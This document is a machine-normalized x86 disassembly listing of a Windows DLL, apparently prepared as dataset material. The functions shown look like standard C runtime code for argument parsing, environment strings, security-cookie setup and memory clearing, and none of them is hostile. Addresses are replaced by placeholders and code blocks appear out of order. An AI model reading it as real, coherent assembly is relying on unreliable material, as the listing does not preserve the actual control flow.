add esp 0x14
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10017dc6
add esp 0x14
cmp eax 0xffffffff
je r-xdata
pop esi
leave
retn
or eax 0xffffffff
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017bb7
push [ ebp - 0x4 ]
mov esi eax
call sub_1000fe7d
push [ ebp - 0x8 ]
call sub_1000fe7d
add esp 0x18
mov eax esi
sub_1001457e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x4 ] edi
cmp edi ebx
jne r-xdata
cmp [ edi ] bl
je r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
pop edi
pop ebx
leave
retn
mov eax [ eax ]
cmp eax ebx
je r-xdata
cmp [ eax ] bl
je r-xdata
push esi
push 0x5c
push edi
call sub_10017acd
push 0x2f
push edi
mov esi eax
call sub_10017acd
add esp 0x10
cmp eax ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov esi eax
cmp eax esi
jbe r-xdata
or [ ebp - 0x10 ] 0xffffffff
push 0x2e
push esi
call sub_10017acd
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x3a
push edi
call sub_10017ba0
mov esi eax
pop ecx
pop ecx
cmp esi ebx
jne r-xdata
push [ ebp - 0x4 ]
call sub_10016180
mov esi eax
add esi 0x5
push 0x1
push esi
call sub_10013c93
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
push ebx
push [ ebp - 0x4 ]
call sub_1001479f
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
call sub_10016180
mov esi eax
add esi 0x3
push 0x1
push esi
call sub_10013c93
mov edi eax
add esp 0xc
mov [ ebp - 0x4 ] edi
cmp edi ebx
je r-xdata
push [ ebp - 0x4 ]
push esi
push eax
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10014504
add esp 0x10
mov [ ebp - 0x10 ] eax
jmp r-xdata
push r--data
push esi
push edi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10016180
mov edi eax
add edi [ ebp - 0x8 ]
pop ecx
call sub_1001129f
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
sub esi edi
add esi eax
mov [ ebp - 0xc ] rw-data
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
pop esi
mov eax [ ebp - 0x10 ]
push [ ebp - 0x4 ]
call sub_1000fe7d
pop ecx
push [ ebp + 0xc ]
push esi
push edi
call sub_10016b4f
add esp 0xc
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
push ebx
push [ ebp - 0x8 ]
call sub_1001479f
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
lea esi [ edi + 0x2 ]
mov edi [ ebp + 0xc ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
call sub_1001129f
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
push [ ebp + 0x10 ]
mov [ eax ] ecx
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10014504
add esp 0x10
mov [ ebp - 0x10 ] eax
sub [ ebp - 0xc ] 0x4
cmp [ ebp - 0xc ] rw-data
jge r-xdata
mov eax [ ebp - 0xc ]
push [ eax ]
push esi
push edi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
push [ ebp - 0x8 ]
call sub_1000fe7d
mov edi [ ebp + 0xc ]
pop ecx
sub_1001479f
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
test [ ebp + 0xc ] 0xfffffff9
jne r-xdata
call sub_100112b2
mov [ eax ] esi
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
push 0x16
pop eax
jmp r-xdata
push [ ebp + 0x8 ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop esi
pop ebp
retn
test al 0x10
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_100112c5
pop ecx
xor eax eax
test al 0x1
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
call sub_100112b2
mov [ eax ] 0x5
call sub_1001129f
mov [ eax ] 0xd
jmp r-xdata
call sub_1001129f
mov eax [ eax ]
jmp r-xdata
sub_10014828
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_10016180
pop ecx
mov edi eax
jmp r-xdata
call sub_100182a7
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_10016180
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_1001828d
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_100148af
push 0x10
push r--data
call sub_10012000
push 0x7
call sub_10011508
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
mov [ ebx ] esi
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
call sub_1001129f
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_10013956
add esp 0x14
mov [ ebp - 0x1c ] edi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
setne al
cmp eax esi
je r-xdata
mov [ eax ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001498c
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
push [ ebp + 0x10 ]
call sub_10014828
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax esi
je r-xdata
mov [ ebp - 0x1c ] esi
push eax
call sub_10016180
mov edi eax
inc edi
push 0x1
push edi
call sub_1001833e
add esp 0xc
mov [ ebx ] eax
cmp eax esi
jne r-xdata
push [ ebp - 0x20 ]
push edi
push eax
call sub_10016c78
add esp 0xc
cmp eax esi
je r-xdata
call sub_1001129f
mov [ eax ] 0xc
call sub_1001129f
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1001382e
add esp 0x14
mov [ eax ] edi
sub_100149b2
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_10016180
mov edi eax
inc edi
push edi
call sub_1000ff5a
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_10016c78
add esp 0xc
jmp r-xdata
sub_10014a32
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10014a0f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10014a84
pop ecx
sub_10014a63
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10014a53
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10014a84
pop ecx
sub_10014a8f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_1001319d
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_1001319d
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_100183ee
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_10013122
mov [ esi ] eax
add esi 0x4
push esi
call sub_10013122
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10013cdf
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10013cdf
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_10013122
pop ecx
mov [ rw-data ] eax
sub_10014b49
mov edi edi
push esi
push 0x4
push 0x20
call sub_10013c93
mov esi eax
push esi
call sub_10013122
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10014b7a
push 0xc
push r--data
call sub_10012000
call sub_10012288
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10014a8f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014bb0
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
sub_10014bcd
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10014c20
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10014cb5
push 0x54
push r--data
call sub_10012000
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_10013c93
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_10013c93
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_10012045
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10016222
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10016222
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_10014f09
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_1000fe7d
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_10014f57
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_10012ddf
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_10013c93
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10016180
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10016180
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_1000fe7d
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_10013c93
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1000fe7d
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001382e
add esp 0x14
sub_10015035
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_100184e4
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_100184e4
pop ecx
test eax eax
je r-xdata
call sub_100184e4
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_100151cf
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_10012ddf
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10015035
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10013c4e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10015035
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1001528a
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_10013c4e
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_10013c4e
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_10010ab0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1000fe7d
pop ecx
mov [ ebp - 0x4 ] ebx
sub_100153c1
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100153e7
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1001540d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_100154a3
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_100154fa
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_100154fa
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_100154a3
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_100155d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
